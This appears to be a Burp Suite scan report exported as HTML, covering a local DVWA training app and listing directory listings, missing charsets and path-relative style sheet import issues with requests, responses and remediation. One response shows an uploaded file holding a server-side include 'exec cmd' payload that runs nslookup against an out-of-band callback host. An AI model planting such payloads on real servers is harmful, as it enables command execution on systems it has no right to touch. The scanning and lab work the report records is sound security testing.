<span class="TEXT"><p>Web servers can be configured to automatically list the contents of directories that do not have an index page present. This can aid an attacker by enabling them to quickly identify the resources at a given path, and proceed directly to analyzing and attacking those resources. It particularly increases the exposure of sensitive files within the directory that are not intended to be accessible to users, such as temporary files and crash dumps.</p>
<p>Directory listings themselves do not necessarily constitute a security vulnerability. Any sensitive resources within the web root should in any case be properly access-controlled, and should not be accessible by an unauthorized party who happens to know or guess the URL. Even when directory listings are disabled, an attacker may guess the location of sensitive files using automated tools.</p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>There is not usually any good reason to provide directory listings, and disabling them may place additional hurdles in the path of an attacker. This can normally be achieved in two ways:</p>
<ul>
<li>Configure your web server to prevent directory listings for all paths beneath the web root; </li>
<li>Place into each directory a default file (such as index.htm) that the web server will display instead of returning a directory listing.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul>
    <li><a href="https://portswigger.net/web-security/information-disclosure/exploiting#directory-listings">Web Security Academy: Information disclosure via directory listings</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/538.html">CWE-538: File and Directory Information Exposure</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/548.html">CWE-548: Information Exposure Through Directory Listing</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/hackable/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=jua1lqh3gd34i4ie6u36vjsbdn<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/hackable/uploads/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:31:37 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>Content-Length: 1419<br>Connection: close<br>Content-Type: text/html;charset=UTF-8<br><br>&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;<br>&lt;html&gt;<br> &lt;head&gt;<br>  <span class="HIGHLIGHT">&lt;title&gt;Index of /dvwa/hackable</span>&lt;/title&gt;<br> &lt;/head&gt;<br> &lt;body&gt;<br>&lt;h1&gt;Index of /dvwa/hackable&lt;/h1&gt;<br>  &lt;table&gt;<br>   &lt;tr&gt;&lt;th valign="top"&gt;&lt;img<br><b>...[SNIP]...</b><br>&lt;th&gt;<span class="HIGHLIGHT">&lt;a href="?C=N;O=D"&gt;Name</span>&lt;/a&gt;&lt;/th&gt;&lt;th&gt;<span class="HIGHLIGHT">&lt;a href="?C=M;O=A"&gt;Last modified</span>&lt;/a&gt;&lt;/th&gt;&lt;th&gt;<span class="HIGHLIGHT">&lt;a href="?C=S;O=A"&gt;Size</span>&lt;/a&gt;&lt;/th&gt;&lt;th&gt;<span class="HIGHLIGHT">&lt;a href="?C=D;O=A"&gt;Description</span>&lt;/a&gt;<br><b>...[SNIP]...</b><br>&lt;td&gt;<span class="HIGHLIGHT">&lt;a href="/dvwa/"&gt;Parent Directory</span>&lt;/a&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="7">7.&nbsp;http://localhost:7878/dvwa/hackable/uploads/</span>
<br><a class="PREVNEXT" href="#6">Previous</a>
&nbsp;<a class="PREVNEXT" href="#8">Next</a>
<br>
<span class="BODH1" id="7.1">7.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00600100_directorylisting">Directory listing</a></span>
<br><a class="PREVNEXT" href="#6.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#8.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/hackable/uploads/</b></td>
</tr>
</table>
<h2>Issue description</h2>
<span class="TEXT"><p>Web servers can be configured to automatically list the contents of directories that do not have an index page present. This can aid an attacker by enabling them to quickly identify the resources at a given path, and proceed directly to analyzing and attacking those resources. It particularly increases the exposure of sensitive files within the directory that are not intended to be accessible to users, such as temporary files and crash dumps.</p>
<p>Directory listings themselves do not necessarily constitute a security vulnerability. Any sensitive resources within the web root should in any case be properly access-controlled, and should not be accessible by an unauthorized party who happens to know or guess the URL. Even when directory listings are disabled, an attacker may guess the location of sensitive files using automated tools.</p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>There is not usually any good reason to provide directory listings, and disabling them may place additional hurdles in the path of an attacker. This can normally be achieved in two ways:</p>
<ul>
<li>Configure your web server to prevent directory listings for all paths beneath the web root; </li>
<li>Place into each directory a default file (such as index.htm) that the web server will display instead of returning a directory listing.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul>
    <li><a href="https://portswigger.net/web-security/information-disclosure/exploiting#directory-listings">Web Security Academy: Information disclosure via directory listings</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/538.html">CWE-538: File and Directory Information Exposure</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/548.html">CWE-548: Information Exposure Through Directory Listing</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/hackable/uploads/?C=N;O=D HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=i4h2e5hqbnsvp8cdp9tcjq74l2<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/hackable/uploads/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:31:34 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>Connection: close<br>Content-Type: text/html;charset=UTF-8<br>Content-Length: 13636<br><br>&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;<br>&lt;html&gt;<br> &lt;head&gt;<br>  <span class="HIGHLIGHT">&lt;title&gt;Index of /dvwa/hackable/uploads</span>&lt;/title&gt;<br> &lt;/head&gt;<br> &lt;body&gt;<br>&lt;h1&gt;Index of /dvwa/hackable/uploads&lt;/h1&gt;<br>  &lt;table&gt;<br>   &lt;tr&gt;&lt;th v<br><b>...[SNIP]...</b><br>&lt;th&gt;<span class="HIGHLIGHT">&lt;a href="?C=N;O=A"&gt;Name</span>&lt;/a&gt;&lt;/th&gt;&lt;th&gt;<span class="HIGHLIGHT">&lt;a href="?C=M;O=A"&gt;Last modified</span>&lt;/a&gt;&lt;/th&gt;&lt;th&gt;<span class="HIGHLIGHT">&lt;a href="?C=S;O=A"&gt;Size</span>&lt;/a&gt;&lt;/th&gt;&lt;th&gt;<span class="HIGHLIGHT">&lt;a href="?C=D;O=A"&gt;Description</span>&lt;/a&gt;<br><b>...[SNIP]...</b><br>&lt;td&gt;<span class="HIGHLIGHT">&lt;a href="/dvwa/hackable/"&gt;Parent Directory</span>&lt;/a&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="8">8.&nbsp;http://localhost:7878/dvwa/hackable/uploads/file.txt.html</span>
<br><a class="PREVNEXT" href="#7">Previous</a>
&nbsp;<a class="PREVNEXT" href="#9">Next</a>
<br>
<span class="BODH1" id="8.1">8.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00800200_htmldoesnotspecifycharset">HTML does not specify charset</a></span>
<br><a class="PREVNEXT" href="#7.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#9.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/hackable/uploads/file.txt.html</b></td>
</tr>
</table>
<h2>Issue description</h2>
<span class="TEXT"><p>If a  response states that it contains HTML content but does not specify a character set, then the browser may analyze the HTML and attempt to determine which character set it appears to be using. Even if the majority of the HTML actually employs a standard character set such as UTF-8, the presence of non-standard characters anywhere in the response may cause the browser to interpret the content using a different character set. This can have unexpected results, and can lead to cross-site scripting vulnerabilities in which non-standard encodings like UTF-7 can be used to bypass the application's defensive filters.</p>
<p>In most cases, the absence of a charset directive does not constitute a security flaw, particularly if the response contains static content. You should review the contents of affected responses, and the context in which they appear, to determine whether any vulnerability exists. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>For every response containing HTML content, the application should include within the Content-type header a directive specifying a standard recognized character set, for example <b>charset=ISO-8859-1</b>.
</p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/436.html">CWE-436: Interpretation Conflict</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/hackable/uploads/file.txt.html HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=23cq3v1mto4nhu17jb5ao21lt5<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/hackable/uploads/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:31:47 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>Last-Modified: Thu, 10 Mar 2022 10:12:07 GMT<br>ETag: "14-5d9da724c32b2"<br>Accept-Ranges: bytes<br>Content-Length: 20<br>Connection: close<br><span class="HIGHLIGHT">Content-Type: text/html</span><br><br>H925QJrKzFjp9egguc5k</span></div>
<div class="rule"></div>
<span class="BODH0" id="9">9.&nbsp;http://localhost:7878/dvwa/hackable/uploads/file.txtnvwhsmxoop.html</span>
<br><a class="PREVNEXT" href="#8">Previous</a>
&nbsp;<a class="PREVNEXT" href="#10">Next</a>
<br>
<span class="BODH1" id="9.1">9.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00800200_htmldoesnotspecifycharset">HTML does not specify charset</a></span>
<br><a class="PREVNEXT" href="#8.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#10.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/hackable/uploads/file.txtnvwhsmxoop.html</b></td>
</tr>
</table>
<h2>Issue description</h2>
<span class="TEXT"><p>If a  response states that it contains HTML content but does not specify a character set, then the browser may analyze the HTML and attempt to determine which character set it appears to be using. Even if the majority of the HTML actually employs a standard character set such as UTF-8, the presence of non-standard characters anywhere in the response may cause the browser to interpret the content using a different character set. This can have unexpected results, and can lead to cross-site scripting vulnerabilities in which non-standard encodings like UTF-7 can be used to bypass the application's defensive filters.</p>
<p>In most cases, the absence of a charset directive does not constitute a security flaw, particularly if the response contains static content. You should review the contents of affected responses, and the context in which they appear, to determine whether any vulnerability exists. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>For every response containing HTML content, the application should include within the Content-type header a directive specifying a standard recognized character set, for example <b>charset=ISO-8859-1</b>.
</p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/436.html">CWE-436: Interpretation Conflict</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/hackable/uploads/file.txtnvwhsmxoop.html HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=2q48noklni1lg7odhuhqusd2rv<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/hackable/uploads/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:31:54 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>Last-Modified: Thu, 10 Mar 2022 10:12:21 GMT<br>ETag: "de-5d9da732d2eff"<br>Accept-Ranges: bytes<br>Content-Length: 222<br>Connection: close<br><span class="HIGHLIGHT">Content-Type: text/html</span><br><br>&lt;!--#set var="tl1" value="sk089u5za1"--&gt;&lt;!--#set var="vn3" value="um2abw71c3"--&gt;&lt;!--#echo var="tl1"--&gt;&lt;!--#echo var="vn3"--&gt;&lt;!--#exec cmd="nslookup -q=cname f7nvwhsmxoop2m5xyad5lugpjgp9dz1rzfr2jq8.bur<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="10">10.&nbsp;http://localhost:7878/dvwa/ids_log.php</span>
<br><a class="PREVNEXT" href="#9">Previous</a>
&nbsp;<a class="PREVNEXT" href="#11">Next</a>
<br>
<span class="BODH1" id="10.1">10.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#9.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#11.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/ids_log.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/ids_log.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=viqk084rpgdmt94s42kjb0lvib<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/security.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:45 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 2823<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;PHPIDS Log :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/ids_log.php<span class="HIGHLIGHT">/bgssic/</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=viqk084rpgdmt94s42kjb0lvib<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/security.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:38:50 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 2823<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;PHPIDS Log :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/ids_log.php/bgssic/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=viqk084rpgdmt94s42kjb0lvib<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/security.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:38:50 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 2823<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;PHPIDS Log :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="11">11.&nbsp;http://localhost:7878/dvwa/index.php</span>
<br><a class="PREVNEXT" href="#10">Previous</a>
&nbsp;<a class="PREVNEXT" href="#12">Next</a>
<br>
<span class="BODH1" id="11.1">11.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#10.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#12.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/index.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
